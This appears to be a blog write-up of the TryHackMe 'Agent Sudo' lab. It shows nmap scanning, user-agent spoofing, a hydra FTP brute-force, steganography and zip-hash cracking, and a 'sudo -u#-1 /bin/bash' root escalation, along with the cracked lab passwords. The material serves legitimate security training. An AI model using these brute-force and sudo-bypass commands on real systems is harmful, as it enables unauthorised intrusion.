---
title: "Agent Sudo machine tryhackme writeup"
excerpt_separator: "<!--more-->"
date: 2024-07-28
categories:
  - TryHackMe Writeups
tags:
  - Hacking
  - Notes
  - writeup
  - ctf
---


### Agent Sudo — TryHackMe Walkthrough

- *My writeups are more of my own mind-map than an "official" walkthrough, it may not seem straightforward sometimes but that's just the beauty of my own thinking.*


## Enumeration & Scanning:

- First, we check which ports are open in the victim machine using **nmap**.
- i went for `*nmap -A -T4 @Victim_IP*`
- We found three open ports ftp, ssh and http ⇒ 21, 22, 80
- Visiting the webpage gives us this page:

![agent-01](/assets/images/agent-01.png)

- The first thing i noticed is that i had to modify the user-agent to access the page so nothing hard we just needed to find the **codenames.**
- Trying with gobuster and see if there is any hidden directory- no luck.
- Coming back to the webpage trying with the letter R spontaneously since it’s the sender name using curl:

```bash
curl -A "R" @Victim_IP
#or
curl --user-agent "R" @Victim_IP
```

- It gives the same page but with an additional message indicating that there are 25 employees which is a major hint since i immediately thought of the Alphabet
- Using intruder with burp i was able to find that user-agent C is the key.
- It’s a message from Agent R to Agent C where the key takeaway is that: 
1- Agent C’s name is ***Chris*** 
2- he’s using ***a weak password***.

## Exploitation

- We know that we have an FTP port open so let’s use hydra to find the weak password.

```bash
hydra -l 'chris' -P /usr/share/wordlists/rockyou.txt ftp://@Victim_IP
```

- The password is ***crystal***.
- Logging in with the credentials we find a text file and two images.
- The text file is from Agent C to Agent J telling them that their login password is hidden in one of the fake images.
- Using steghide we need a passphrase on the cute_alien.jpg but we get something from cutie.png using exiftool.

![agent-02](/assets/images/agent-02.png)

- to extract the hidden data we use **`*exiftool -b cutie.png*`**
- Then i learned that trying to convert it to hex we can get more infos like this:

![agent-03](/assets/images/agent-03.png)

- We can see that there’s a text file embedded in there to extract it we use `binwalk`.

```bash
binwalk cutie.png
#to extract the zip file
binwalk -e cutie.png
```

![agent-04](/assets/images/agent-04.png)

- With that we extract a zip file but it’s protected with a password so we need to crack it with john.

```bash
zip2john 8702.zip > hash.txt
#then crack it
john hash.txt
```

- The password is “alien” so we unzip it with the command `7z e 8702.zip` and get the file.
- It gives us the password to the cute_alien.jpg but base64 encoded so after decoding it we get the word “Area51”
- the hidden message inside the image is the password for the Agent J (whose name is james btw) which is hackerrules!

### User flag:

- connecting through ssh with the recent credentials we find the user flag inside james directory.

### Root flag:

- using sudo -l to see which permissions do we have with the user james we see something odd.

```bash
(ALL, !root) /bin/bash
```

- This means that we can run everything as root except bash, fortunately there’s a rather easy exploit for this simply:

  

```bash
sudo -u#-1 /bin/bash
```

- And we’re root! 🥳, we get the flag from root directory and finish the room.